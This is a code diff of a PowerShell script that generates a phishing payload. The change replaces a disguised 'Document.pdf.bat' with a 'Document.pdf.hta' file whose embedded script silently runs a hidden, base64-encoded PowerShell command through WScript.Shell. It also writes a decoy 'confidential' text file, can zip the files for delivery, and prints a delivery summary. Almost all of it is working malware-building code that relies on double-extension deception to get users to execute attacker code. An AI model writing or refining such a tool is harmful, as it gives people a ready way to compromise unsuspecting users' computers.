@@ -17,9 +17,20 @@ if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }
 
 Write-Output "Generating payload in: $Path"
 
-# Document.pdf.bat (shows as Document.pdf with extensions hidden)
-Set-Content "$Path\Document.pdf.bat" "@echo off`r`npowershell -w h -Enc $encCmd" -Encoding ASCII
-Write-Output "  [+] Document.pdf.bat created"
+# Document.pdf.hta (shows as Document.pdf, opens via mshta.exe)
+$htaContent = @"
+<html><head><title>Document</title></head>
+<body>
+<script>
+var s = new ActiveXObject("WScript.Shell");
+s.Run("powershell -w h -Enc $encCmd", 0);
+window.close();
+</script>
+</body>
+</html>
+"@
+Set-Content "$Path\Document.pdf.hta" $htaContent -Encoding UTF8
+Write-Output "  [+] Document.pdf.hta created"
 
 # Decoy Document.txt
 Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
@@ -32,7 +43,7 @@ Write-Output "  [+] README.txt created"
 # Optional zip
 if ($Zip) {
     $zipFiles = @()
-    foreach ($f in @("Document.pdf.bat", "Document.txt", "README.txt")) {
+    foreach ($f in @("Document.pdf.hta", "Document.txt", "README.txt")) {
         $fp = "$Path\$f"
         if (Test-Path $fp) { $zipFiles += $fp }
     }
@@ -47,6 +58,6 @@ if ($Zip) {
 Write-Output ""
 Write-Output "=== DELIVERY SUMMARY ==="
 Write-Output "Folder: $Path"
-Write-Output "Batch:  Document.pdf.bat (shows as Document.pdf with extensions hidden)"
+Write-Output "HTA:    Document.pdf.hta (shows as Document.pdf, opens via mshta.exe)"
 if ($Zip -and (Test-Path "$Path\Document.zip")) { Write-Output "Zipped: Document.zip" }
 Write-Output "=========================="
